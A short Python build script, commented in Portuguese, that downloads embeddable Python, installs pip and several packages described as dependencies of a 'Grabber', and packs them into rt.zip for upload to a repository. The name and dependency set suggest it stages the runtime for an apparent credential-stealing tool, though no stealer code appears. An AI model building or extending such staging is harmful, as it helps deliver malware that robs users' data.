# language: Python, file: build_embed.py, target: Windows
# Baixa o Python Embeddable, instala o PIP, instala as dependências do Grabber, e gera o rt.zip
import urllib.request
import zipfile
import os
import shutil
import subprocess

PYTHON_URL = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
GET_PIP_URL = "https://bootstrap.pypa.io/get-pip.py"
DEPS = ["requests", "pycryptodome", "pywin32", "Pillow", "wmi"]

def build():
    print("[*] Criando ambiente de build...")
    build_dir = "rt_build"
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)

    print("[*] Baixando Python Embeddable 3.11...")
    py_zip = os.path.join(build_dir, "python.zip")
    urllib.request.urlretrieve(PYTHON_URL, py_zip)

    print("[*] Extraindo Python...")
    with zipfile.ZipFile(py_zip, 'r') as zip_ref:
        zip_ref.extractall(build_dir)
    os.remove(py_zip)

    print("[*] Ativando site-packages (modificando python311._pth)...")
    pth_file = os.path.join(build_dir, "python311._pth")
    with open(pth_file, "r") as f:
        pth_data = f.read()
    # Descomenta 'import site' para o Python ler a pasta Lib/site-packages
    pth_data = pth_data.replace("#import site", "import site")
    with open(pth_file, "w") as f:
        f.write(pth_data)

    print("[*] Baixando get-pip.py...")
    pip_script = os.path.abspath(os.path.join(build_dir, "get-pip.py"))
    urllib.request.urlretrieve(GET_PIP_URL, pip_script)

    print("[*] Instalando PIP...")
    python_exe = os.path.abspath(os.path.join(build_dir, "python.exe"))
    subprocess.run([python_exe, pip_script], cwd=build_dir)

    print("[*] Instalando dependências (Requests, PyCryptodome, etc)...")
    subprocess.run([python_exe, "-m", "pip", "install", "--no-warn-script-location"] + DEPS, cwd=build_dir)

    # Limpeza para reduzir tamanho do ZIP
    os.remove(pip_script)
    shutil.rmtree(os.path.join(build_dir, "Scripts"), ignore_errors=True)

    print("[*] Compactando rt.zip...")
    shutil.make_archive("rt", 'zip', build_dir)
    shutil.rmtree(build_dir)

    print("[+] SUCESSO! rt.zip gerado (Tamanho: ~18MB). Faça o upload deste arquivo no seu repositório!")

if __name__ == "__main__":
    build()
